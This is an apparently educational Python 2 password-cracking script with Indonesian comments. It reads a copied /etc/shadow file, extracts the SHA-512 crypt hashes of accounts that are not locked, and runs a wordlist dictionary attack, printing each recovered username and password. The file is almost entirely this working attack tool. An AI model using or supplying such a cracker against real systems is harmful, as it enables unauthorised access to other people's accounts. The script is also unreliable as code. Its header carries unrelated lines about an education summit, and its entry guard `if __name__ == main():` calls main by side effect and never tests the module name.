  1 #!/usr/bin/python
  2 # written for py-sec.org
  3 # ASIA Education Summit, February 23 - 26 2016, Bangkok
  4 # OUT OF SCHOOL CHILDREN
  5 
  6 import crypt
  7 
  8 def crackingHash(hashPass,userName):
  9         dictionaryFile = open("dictionary.txt",'r')           # Membaca wordlist 
 10         hashType = hashPass.split("$")[1]                     # Meng-ekstrack hash identifier
 11         if hashType == '6':                                   # Meng-identifikasi hash yang digunakan
 12                 print "\n" + "[*] Password cracking in progress ..."
 13                 print "[*] Tipe Hash yang digunakan: SHA-512" + "\n"
 14                 salt = hashPass.split("$")[2]
 15                 insalt = "$" + hashType + "$" + salt + "$"    # Menghitung salt untuk dictionary attack
 16                 counter = 1
 17                 for word in dictionaryFile.readlines():
 18                         word = word.strip("\n")               # Meng-ekstrak wordlist dari dictionary           
 19                         print "[+] Wordlist ke - %s: "%counter
 20                         hashWord = crypt.crypt(word,insalt)   # Menghitung hash dari wordlist
 21                         if hashWord == hashPass:              # Apabila hash dari wordlist cocok dengan hash dari password, maka cracking berhasil   
 22                                 print "[+] PASSWORD CRACKING BERHASIL"
 23                                 print "[+] user        :     " + userName
 24                                 print "[+] password-nya: " + word + "\n"
 25                         else:                                 # Apabila hash dari wordlist tidak cocok dengan hash dari password, maka cracking gagal
 26                                 print "[-] PASSWORD CRACKING  GAGAL" + "\n"
 27                         counter += 1
 28 def main():
 29         userAccount = open("shadow","r")                      # Membaca file pada /etc/shadow    
 30         counter = 1
 31         print "\n" + "Account yang akan di crack adalah :"
 32         for line in userAccount.readlines():                  # Memilah setiap account pada /etc/shadow
 33                 line = line.replace("\n","").split(":")       # Membuat sembilan kolom 
 34                 if not line[1] in ['*', '!','x']:             # Hanya memilih account tanpa karakter *, ! dan x
 35                         userName = line[0]                    # Memilih user account atau field pertama
 36                         hashPass = line[1]                    # Memilih hash dari user account atau field kedua
 37                         print "#############################################################################################################"
 38                         print "\n" + "#Cracking ACCOUNT ke - %s"%counter + "\n"
 39                         print "[+] user : " + userName
 40                         print "[+] hash : " + hashPass + "\n"
 41                         print "#############################################################################################################" + "\n"
 42                         crackingHash(hashPass, userName)
 43                 counter += 1
 44         print "Password cracking finished .... " + "\n"
 45 
 46 if __name__ == main():
 47         main()
 48 
~                                                                                                                                                                                   
                                                                                                                                                                  1,17          All
